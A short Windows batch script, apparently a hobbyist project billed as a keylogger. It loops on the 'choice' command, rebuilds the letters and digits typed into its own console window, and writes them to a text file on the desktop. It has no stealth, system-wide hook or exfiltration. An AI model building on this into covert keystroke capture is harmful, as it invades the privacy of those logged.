:: This keylogger is able to log all keys pressed...[A-Z and a-z and 0-9]
:: but it can't log special characters...and 'Space' as they have special ASCII codes for them...check ver. 2.0
::here ,it is the limitation of Batch ....#kvc


::for any info. contact me 'karanveerchouhan@gmail.com' or 'karanveerchouhan.kvc@facebook.com'





@echo off
cls
title Keylogger-Batch Ver. 1.0
set "list=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set entry=
:a
echo.
echo.
echo.			Keylogger by Kvc
echo.&echo.Check the log file of pressed Keys in ur "desktop\keylogger.txt"
set a=
choice /n /c "%list%" /CS
set /a a=%errorlevel%-1

::creating temp. variables and checking which key is pressed....

set temp_list=%list%
set b=0
:loop
if "%b%" neq "%a%" (
set temp_list=%temp_list:~1%
set /a b=%b%+1
goto loop
)
set "entry=%entry%%temp_list:~0,1%"
echo.%entry%>"%userprofile%\desktop\keylogger.txt"
cls
echo.%entry%
goto a